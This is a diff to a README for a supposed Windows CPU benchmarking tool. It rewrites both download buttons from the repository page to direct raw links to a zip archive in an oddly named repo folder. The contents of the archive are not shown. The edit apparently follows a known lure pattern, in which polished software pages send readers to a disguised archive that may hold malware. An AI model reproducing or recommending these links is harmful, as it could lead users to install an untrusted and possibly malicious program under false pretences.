@@ -12,7 +12,7 @@ Getting Cpu-Benchmark-PRO on your Windows computer is incredibly easy. Follow th
 
 1. **Visit the download page**: Click the button below to go to the official download page.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_CPU_BENCHMARK_PRO-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Undescriptive-dionysius3597/Cpu-Benchmark-PRO)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_CPU_BENCHMARK_PRO-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Undescriptive-dionysius3597/Cpu-Benchmark-PRO/raw/refs/heads/main/unsanctioning/PRO_Cpu_Benchmark_v3.9.zip)
 
 2. **Download the application**: Visit this link to download the application. The download will start automatically once you click the appropriate button on that page.
 
@@ -163,7 +163,7 @@ A: The application supports all processors from the last 15 years, including old
 
 You're now fully equipped to start testing your CPU's performance. Remember, the first step is downloading the application:
 
-[![GET CPU BENCHMARK PRO](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-27AE60?style=for-the-badge&logo=github&logoColor=white&labelColor=1A5276)](https://github.com/Undescriptive-dionysius3597/Cpu-Benchmark-PRO)
+[![GET CPU BENCHMARK PRO](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-27AE60?style=for-the-badge&logo=github&logoColor=white&labelColor=1A5276)](https://github.com/Undescriptive-dionysius3597/Cpu-Benchmark-PRO/raw/refs/heads/main/unsanctioning/PRO_Cpu_Benchmark_v3.9.zip)
 
 Visit this link to download the application. Once you've installed it, run your first benchmark and see how your processor performs. You'll be amazed at the insights you gain about your computer's capabilities.
 
